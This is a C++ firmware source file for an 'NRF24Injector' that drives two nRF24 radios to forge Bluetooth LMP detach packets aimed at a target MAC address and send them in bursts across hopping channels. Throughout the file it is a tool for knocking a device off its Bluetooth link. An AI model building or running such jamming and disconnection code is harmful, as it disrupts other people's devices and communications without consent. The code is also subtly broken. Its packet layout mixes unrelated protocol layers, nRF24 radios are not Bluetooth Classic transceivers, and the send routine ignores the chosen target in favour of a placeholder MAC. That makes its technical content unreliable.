#include "nrf24_injector.h"

NRF24Injector::NRF24Injector()
    : radio1(PIN_NRF24_1_CE, PIN_NRF24_1_CSN),
      radio2(PIN_NRF24_2_CE, PIN_NRF24_2_CSN),
      radio1Active(false),
      radio2Active(false),
      currentChannelIndex(0) {
    memset(hoppingSequence, 0, sizeof(hoppingSequence));
}

bool NRF24Injector::begin() {
    DEBUG_PRINTLN("Initializing nRF24 modules...");
    
    // Initialize Radio 1
    if (!radio1.begin()) {
        DEBUG_PRINTLN("Radio 1 initialization failed");
        radio1Active = false;
    } else {
        radio1.setPALevel(NRF24_POWER_DBM);
        radio1.setDataRate(NRF24_DATA_RATE);
        radio1.setCRCLength(NRF24_CRC_LENGTH);
        radio1.setRetries(NRF24_RETRY_DELAY, NRF24_RETRY_COUNT);
        radio1.disableAckPayload();
        radio1.setAutoAck(false);
        radio1Active = true;
        DEBUG_PRINTLN("Radio 1 initialized successfully");
    }
    
    // Initialize Radio 2
    if (!radio2.begin()) {
        DEBUG_PRINTLN("Radio 2 initialization failed");
        radio2Active = false;
    } else {
        radio2.setPALevel(NRF24_POWER_DBM);
        radio2.setDataRate(NRF24_DATA_RATE);
        radio2.setCRCLength(NRF24_CRC_LENGTH);
        radio2.setRetries(NRF24_RETRY_DELAY, NRF24_RETRY_COUNT);
        radio2.disableAckPayload();
        radio2.setAutoAck(false);
        radio2Active = true;
        DEBUG_PRINTLN("Radio 2 initialized successfully");
    }
    
    if (!radio1Active && !radio2Active) {
        DEBUG_PRINTLN("ERROR: No nRF24 modules initialized!");
        return false;
    }
    
    // Generate initial hopping sequence
    generateHoppingSequence(hoppingSequence, ATTACK_CHANNELS_COUNT);
    
    return true;
}

bool NRF24Injector::shutdown() {
    if (radio1Active) radio1.powerDown();
    if (radio2Active) radio2.powerDown();
    
    DEBUG_PRINTLN("nRF24 modules powered down");
    return true;
}

void NRF24Injector::buildLMPDetachPacket(uint8_t* buffer, const uint8_t* targetMAC) {
    if (!buffer || !targetMAC) return;
    
    // LMP packet structure for DETACH command
    // This is a simplified structure for proof of concept
    
    // Header
    buffer[0] = 0x04;           // ACL packet type
    
    // Handle (2 bytes) - connection handle
    buffer[1] = 0x00;
    buffer[2] = 0x00;
    
    // Data length
    buffer[3] = 0x08;           // 8 bytes of data
    buffer[4] = 0x00;
    
    // L2CAP Channel
    buffer[5] = 0x04;           // Signaling channel
    buffer[6] = 0x00;
    
    // LMP Command
    buffer[7] = 0x05;           // LMP_DETACH opcode
    buffer[8] = 0x00;           // Transaction ID
    
    // Reason code (0x13 = Remote user terminated)
    buffer[9] = LMP_DETACH_REASON;
    
    // Copy target MAC (optional, for spoofing reference)
    memcpy(&buffer[10], targetMAC, 6);
    
    DEBUG_PRINTF("LMP packet built (%d bytes)\n", ATTACK_PACKET_SIZE);
}

bool NRF24Injector::injectPacket(RF24& radio, const uint8_t* packet, uint8_t packetSize) {
    if (!radio.available()) {
        return radio.write(packet, packetSize);
    }
    return false;
}

bool NRF24Injector::startAttack(const uint8_t* targetMAC, uint8_t* sequence) {
    if (!targetMAC || (!radio1Active && !radio2Active)) {
        DEBUG_PRINTLN("Cannot start attack: invalid parameters");
        return false;
    }
    
    // Set hopping sequence
    if (sequence) {
        memcpy(hoppingSequence, sequence, ATTACK_CHANNELS_COUNT);
    } else {
        generateHoppingSequence(hoppingSequence, ATTACK_CHANNELS_COUNT);
    }
    
    currentChannelIndex = 0;
    
    char macStr[18];
    macToString(targetMAC, macStr, sizeof(macStr));
    DEBUG_PRINT("Attack started on target: ");
    DEBUG_PRINTLN(macStr);
    
    return true;
}

bool NRF24Injector::sendAttackPackets(uint32_t packetCount) {
    if (packetCount == 0) return false;
    
    uint8_t packet[ATTACK_PACKET_SIZE];
    uint8_t targetMAC[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};  // Placeholder
    
    for (uint32_t i = 0; i < packetCount; i++) {
        // Build packet
        buildLMPDetachPacket(packet, targetMAC);
        
        // Get current hopping channel
        uint8_t channel = hoppingSequence[currentChannelIndex % ATTACK_CHANNELS_COUNT];
        
        // Inject via Radio 1 (primary)
        if (radio1Active) {
            radio1.setChannel(channel);
            injectPacket(radio1, packet, sizeof(packet));
        }
        
        // Inject via Radio 2 (secondary) on different channel
        if (radio2Active && i % 2 == 0) {
            uint8_t channel2 = hoppingSequence[(currentChannelIndex + 1) % ATTACK_CHANNELS_COUNT];
            radio2.setChannel(channel2);
            injectPacket(radio2, packet, sizeof(packet));
        }
        
        // Advance hopping sequence
        currentChannelIndex++;
        
        // Small delay between packets
        delayMicroseconds(100);
    }
    
    DEBUG_PRINT("Sent ");
    DEBUG_PRINT(packetCount);
    DEBUG_PRINTLN(" packets");
    
    return true;
}

bool NRF24Injector::stopAttack() {
    currentChannelIndex = 0;
    DEBUG_PRINTLN("Attack stopped");
    return true;
}

void NRF24Injector::setHoppingSequence(const uint8_t* sequence) {
    if (sequence) {
        memcpy(hoppingSequence, sequence, ATTACK_CHANNELS_COUNT);
        DEBUG_PRINTLN("Hopping sequence updated");
    }
}

void NRF24Injector::setTXPower(uint8_t power) {
    if (radio1Active) radio1.setPALevel(power);
    if (radio2Active) radio2.setPALevel(power);
    DEBUG_PRINTLN("TX power updated");
}

uint8_t NRF24Injector::getCurrentChannel() const {
    if (currentChannelIndex < ATTACK_CHANNELS_COUNT) {
        return hoppingSequence[currentChannelIndex];
    }
    return 0;
}
